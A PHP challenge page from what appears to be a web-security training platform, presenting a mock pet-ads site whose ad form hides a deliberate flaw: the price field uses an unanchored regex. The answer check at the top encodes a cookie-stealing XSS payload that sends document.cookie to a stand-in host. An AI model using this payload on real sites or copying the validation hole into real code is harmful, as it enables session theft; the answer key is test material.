<?php

include_once dirname(__FILE__).'/../../init.php';
session_start();
require_once(HACKADEMIC_PATH."controller/class.ChallengeValidatorController.php");

$solution = new RegexSolution(RegexSolution::JS_BEGIN.'document\.location(\.href)? ?= ?"http:\/\/yourserver\.com\/\?c=" ?\+ ?document\.cookie'.RegexSolution::JS_END);
$validator = new ChallengeValidatorController($solution);
$validator->startChallenge();

?>
<!DOCTYPE html>
<html lang="fr">
<head>
	<meta charset="iso-8859-15">
	<link rel="icon" href="data/logo.png"/>
	<link href="data/style2.css" rel="stylesheet" type="text/css">
	<title>Sell your pet!</title>
</head>
<body class="ua_FIR">
	<div class="page_align" id="page_align">
		<div class="page_width" id="page_width">
			<div id="ContainerMain">
				<div id="account_login_f">
					<div id="screen_form" class="account_screen">
						<div class="form_container">
							<form id="account_login_form" name="loginform" method="post">
								<div class="form_el name">Email</div>
								<div class="form_el input">
									<input name="email" type="text">
								</div>
								<div class="form_el pass">Password</div>
								<div class="form_el input">
									<input name="password" type="password">
								</div>
								<div class="form_el submit_ok">
									<input value="ok" type="submit">
								</div>
								<div class="clearer"></div>
							</form>
						</div>
						<div class="clearer"></div>
						<div id="lost_passwd">
							<div class="left_float create_acc">
							<?php
								if(isset($_POST['email']) && isset($_POST['password'])) {
									echo '<span style="color: red;">&nbsp;&nbsp;&nbsp;&nbsp;Wrong password! </span>';
								}
							?>
							</div>
							<div class="left_float lost_pwd">
								<a href="#">&gt; Forgot your password?</a>
							</div>
							<div class="clearer"></div>
						</div>
					</div>
					<div id="pass_lost_f" class="account_screen">
						<div class="form_container">
							<form id="pass_lost_form" name="passlostform" method="post">
								<div class="form_el name">Enter your email address and validate to reinitialize your password.</div>
								<div class="form_el input">
									<input name="ar_email" type="text">
								</div>
								<div class="form_el submit_ok">
									<input value="ok" type="submit">
								</div>
								<div class="clearer"></div>
							</form>
						</div>
						<div class="clearer"></div>
						<div id="lost_passwd_cancel">
							<a href="#">&lt; Back</a>
						</div>
					</div>
					<div id="create_acc_f" class="account_screen">
					<div id="create_acc_head">
					You are:
					</div>
					<div class="form_container">
						<div class="left_float create_part">
							<a href="#" class="create_acc_link">Individual</a>
						</div>
						<div class="left_float create_pro">
							<a href="#" class="create_acc_link">Professional</a>
						</div>
						<div class="clearer"></div>
					</div>
					<div class="clearer"></div>
					<div id="create_acc_cancel">
						<a href="#">&lt; Back</a>
					</div>
					</div>
				</div>
				<header id="headermain">
					<a href="#">
						<img src="data/logo.png" height="80px" title="Sell your pet!" alt="Sell your pet!" id="header_logo">
					</a>
				</header>
				<nav>
					<ul id="nav_main" class="navmain">
						<li class="accueil">
							<a href="index.php">Home</a>
						</li>
						<li class="deposer selected">
							<a href="place-your-ad.php">Place an ad</a>
						</li>
						<li class="offre">
							<a href="index.php">Ads</a>
						</li>
						<li class="mes_annonces">
							<a id="link_adwatch" href="#">My ads</a>
						</li>
						<li class="compte_pro">
							<a href="#">My account</a>
						</li>
						<li class="aide">
							<a href="#">Help</a>
						</li>
					</ul>
				</nav>
				<div id="account_submenu">
					<div class="account_submenu_arrow"></div>
					<ul class="account_submenu_ul">
						<li>
							<a href="#">Individual</a>
						</li>
						<li class="li_sep"></li>
						<li>
							<a href="#">Professional</a>
						</li>
					</ul>
				</div>
				<div class="content-color">
					<div class="maintext">
						<div>
							<p>
							<?php
								$fields = array('country' => array('/^\d+$/', 'country'), 
												'city' => array('/^[\w\s-\.]+$/', 'city'), 
												'postal_address' => array('/^[\w\s-\.]+$/', 'postal address'), 
												'category' => array('/^\d+$/', 'category'), 
												'professional' => array('/^(yes|no)$/', 'Professional'), 
												'name' => array('/^[\w\s-]+$/', 'name'), 
												'email' => array('/^[\w\.-]+@[\w\.-]+\.[\w]{1,5}$/', 'email address'), 
												'phone' => array('/^\d+$/', 'phone number'),
												'ad_text' => array('/^[\w\s-_\.]+$/', 'text'), 
												'title' => array('/^[\w\s-_\.]+$/', 'title'), 
												'price' => array('/\d+/', 'price'));
								$errorMessages = array();
								foreach($fields as $field => $infos) {
									$regex = $infos[0];
									$name = $infos[1];
									if(!isset($_POST[$field])) {
										$errorMessages[] = 'The '.$name.' field is missing.';
									} else if(!preg_match($regex, $_POST[$field])) {
										$errorMessages[] = 'The '.$name.' value is incorrect.';
									}
								}

								foreach($errorMessages as $errorMessage) {
									echo '<p style="font-weight: bold; color: red;">'.$errorMessage.'</p>';
								}

								if(count($errorMessages) == 0) {
									$validator->validateSolution($_POST['price']);

									echo '<p style="font-weight: bold; color: #F60;">';
									echo 'Your ad has been registered and will be available for 12 days.';
									echo '</p>';
								}
							?>
							</p>
						</div>
					</div>
					<div class="clear"></div>
				</div>
				<img src="data/hit.png" height="1" width="1">
				<nav>
					<div id="footer">
						<a id="footer_cgu_link" href="#">Legal&nbsp;notice</a>
						<a id="footer_who_link" href="#">Who&nbsp;are&nbsp;we?</a>
						<a id="footer_contact_link" href="#">Contact</a>
						<a id="footer_recrut_link" href="#">Careers</a>
						<a href="#">Ads</a>
						<a id="footer_pack_immo_link" href="#">Real&nbsp;estate&nbsp;professional</a>
						<a id="footer_mobile_link" href="#">Mobile</a>
						<a id="footer_rules_link" href="#">Diffusion&nbsp;rules</a>
						<br>
						<a id="footer_cgv_link" href="#">Terms&nbsp;and&nbsp;Conditions</a>
						<a id="footer_bookmark_link" href="#">Add&nbsp;to&nbsp;my&nbsp;favorites</a>
						<a id="footer_cookies_link" class="Link" href="#">Your&nbsp;cookies</a>
					</div>
				</nav>
			</div>
		</div>
	</div>
	<div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all"></div>
	<div id="cdx"></div>
</body>
</html>